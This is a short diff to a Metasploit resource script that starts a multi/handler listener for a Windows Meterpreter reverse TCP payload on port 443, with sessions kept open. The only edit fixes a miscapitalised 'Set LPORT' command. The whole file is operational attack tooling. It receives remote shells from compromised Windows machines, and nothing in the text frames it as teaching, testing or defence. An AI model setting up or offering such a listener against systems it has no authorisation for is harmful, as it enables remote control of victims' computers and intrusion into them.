@@ -1,6 +1,6 @@
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
-Set LPORT 443
+set LPORT 443
 set ExitOnSession false
 exploit
